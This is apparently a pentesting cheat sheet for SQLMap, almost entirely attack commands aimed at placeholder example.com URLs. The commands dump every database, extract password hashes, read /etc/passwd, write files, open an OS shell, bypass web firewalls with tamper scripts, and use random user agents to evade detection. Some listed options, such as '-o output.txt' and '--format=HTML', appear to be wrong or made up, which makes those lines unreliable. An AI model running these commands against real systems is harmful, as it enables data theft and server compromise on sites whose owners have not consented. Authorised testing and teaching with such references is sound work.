# SQLMap Ultimate Cheat Sheet

## Overview
SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

## Basic Syntax
```bash
sqlmap [options] -u <target-url>
```

## Installation & Update
```bash
# Install on Kali Linux
sudo apt install sqlmap

# Install from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

# Update
sqlmap --update
```

## Basic Detection
```bash
# Basic vulnerability test
sqlmap -u "http://example.com/page.php?id=1"

# Test with POST data
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"

# Test with cookie
sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123; security=low"

# Test with HTTP headers
sqlmap -u "http://example.com/page.php" --headers="X-Forwarded-For: 127.0.0.1"
```

## Target Specification
```bash
# URL with parameter
sqlmap -u "http://example.com/page.php?id=1"

# Multiple parameters
sqlmap -u "http://example.com/page.php?id=1&cat=2"

# Specific parameter to test
sqlmap -u "http://example.com/page.php?id=1&cat=2" -p id

# POST request from file
sqlmap -r request.txt

# Google dork results
sqlmap -g "inurl:index.php?id="
```

## Enumeration & Discovery
```bash
# Get database banner
sqlmap -u "http://example.com/page.php?id=1" --banner

# Get current database
sqlmap -u "http://example.com/page.php?id=1" --current-db

# Get current user
sqlmap -u "http://example.com/page.php?id=1" --current-user

# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# List tables of specific database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns of specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump

# Dump all databases
sqlmap -u "http://example.com/page.php?id=1" --dump-all

# Get database users
sqlmap -u "http://example.com/page.php?id=1" --users

# Get password hashes
sqlmap -u "http://example.com/page.php?id=1" --passwords
```

## Advanced Techniques
```bash
# Level and risk (1-5, 1-3)
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3

# Time-based blind injection
sqlmap -u "http://example.com/page.php?id=1" --technique=T

# Union-based injection
sqlmap -u "http://example.com/page.php?id=1" --technique=U

# Error-based injection
sqlmap -u "http://example.com/page.php?id=1" --technique=E

# Stacked queries
sqlmap -u "http://example.com/page.php?id=1" --technique=S

# All techniques (default)
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST
```

## Bypassing WAF/Protections
```bash
# Tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper="space2comment,charencode"

# Proxy through Burp
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Random agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Delay between requests
sqlmap -u "http://example.com/page.php?id=1" --delay=2

# Timeout
sqlmap -u "http://example.com/page.php?id=1" --timeout=30

# Retries
sqlmap -u "http://example.com/page.php?id=1" --retries=3
```

## Common Tamper Scripts
```bash
# Basic obfuscation
--tamper=space2comment
--tamper=space2plus
--tamper=space2randomblank

# Advanced obfuscation
--tamper=charencode
--tamper=charunicodeencode
--tamper=equaltolike

# MySQL specific
--tamper=halfversionedmorekeywords
--tamper=versionedmorekeywords

# MSSQL specific
--tamper=between

# All tamper scripts
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## File System Operations
```bash
# Read file
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://example.com/page.php?id=1" --file-write="local.txt" --file-dest="/tmp/remote.txt"

# OS shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# OS command execution
sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"
```

## Database Operations
```bash
# SQL shell
sqlmap -u "http://example.com/page.php?id=1" --sql-shell

# SQL query execution
sqlmap -u "http://example.com/page.php?id=1" --sql-query="SELECT user()"

# Database escalation
sqlmap -u "http://example.com/page.php?id=1" --priv-esc

# Add new user
sqlmap -u "http://example.com/page.php?id=1" --sql-query="CREATE USER test IDENTIFIED BY 'test'"
```

## Performance & Optimization
```bash
# Threads
sqlmap -u "http://example.com/page.php?id=1" --threads=10

# Batch mode (no questions)
sqlmap -u "http://example.com/page.php?id=1" --batch

# No logging
sqlmap -u "http://example.com/page.php?id=1" --no-logging

# Fresh queries
sqlmap -u "http://example.com/page.php?id=1" --fresh-queries

# Parse errors
sqlmap -u "http://example.com/page.php?id=1" --parse-errors
```

## Output & Reporting
```bash
# Save output to file
sqlmap -u "http://example.com/page.php?id=1" -o output.txt

# Different output formats
sqlmap -u "http://example.com/page.php?id=1" --output-dir=/tmp/results

# CSV output
sqlmap -u "http://example.com/page.php?id=1" --dump -D database_name -T table_name --csv

# HTML report
sqlmap -u "http://example.com/page.php?id=1" --dump --output-dir=report --format=HTML
```

## Authentication
```bash
# HTTP authentication
sqlmap -u "http://example.com/page.php?id=1" --auth-type Basic --auth-cred "admin:password"

# Cookie authentication
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=value; security=low"

# Form authentication
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --method POST

# CSRF token handling
sqlmap -u "http://example.com/page.php" --data="id=1&token=abc123" --csrf-token="token"
```

## Advanced Options
```bash
# Second order injection
sqlmap -u "http://example.com/first.php?id=1" --second-url="http://example.com/second.php"

# Crawl website
sqlmap -u "http://example.com/" --crawl=2

# Forms detection
sqlmap -u "http://example.com/" --forms

# Custom injection marker
sqlmap -u "http://example.com/page.php?id=1*" --prefix="'" --suffix="-- -"

# DBMS identification
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# OS identification
sqlmap -u "http://example.com/page.php?id=1" --os=Linux
```

## Practical Examples

### Basic Injection Test
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --random-agent
```

### Comprehensive Assessment
```bash
sqlmap -u "http://example.com/page.php?id=1" \
  --technique=BEUST \
  --level=5 \
  --risk=3 \
  --dbms=mysql \
  --os=Linux \
  --batch \
  --random-agent \
  --proxy="http://127.0.0.1:8080" \
  --tamper="between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes" \
  --dump-all \
  --output-dir=./results
```

### POST Request Testing
```bash
sqlmap -u "http://example.com/login.php" \
  --data="username=admin&password=test" \
  --method=POST \
  --level=5 \
  --risk=3
```

### Cookie-Based Authentication
```bash
sqlmap -u "http://example.com/admin.php" \
  --cookie="PHPSESSID=abc123; admin=true" \
  --level=5 \
  --risk=3 \
  --dbs
```

### File Read Example
```bash
sqlmap -u "http://example.com/page.php?id=1" \
  --file-read="/etc/passwd" \
  --output-dir=./loot
```

### OS Shell
```bash
sqlmap -u "http://example.com/page.php?id=1" \
  --os-shell \
  --os-pwn
```

## Integration with Other Tools

### Burp Suite Integration
```bash
# Save request from Burp to file and use with sqlmap
sqlmap -r request.txt

# Use Burp as proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Combine with Nmap
```bash
# Find potential targets first
nmap -p 80 --script http-sql-injection example.com

# Then test with sqlmap
sqlmap -u "http://example.com/vulnerable.php?id=1"
```

## Tips & Best Practices

1. **Always test on authorized systems only**
2. **Use proxies** to monitor traffic (Burp/ZAP)
3. **Start with low risk/level** and increase gradually
4. **Use random user agents** to avoid detection
5. **Respect rate limiting** with --delay option
6. **Save your results** with --output-dir
7. **Use batch mode** for automated testing
8. **Combine techniques** for better detection
9. **Update regularly** for latest features
10. **Understand the tamper scripts** before using them

## Common DBMS Payloads

### MySQL
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql
```

### Microsoft SQL Server
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=mssql
```

### PostgreSQL
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=postgresql
```

### Oracle
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbms=oracle
```

## Error Handling
```bash
# Ignore errors and continue
sqlmap -u "http://example.com/page.php?id=1" --ignore-errors

# Specific error codes to ignore
sqlmap -u "http://example.com/page.php?id=1" --ignore-code=401,403

# Retry on failure
sqlmap -u "http://example.com/page.php?id=1" --retries=3
```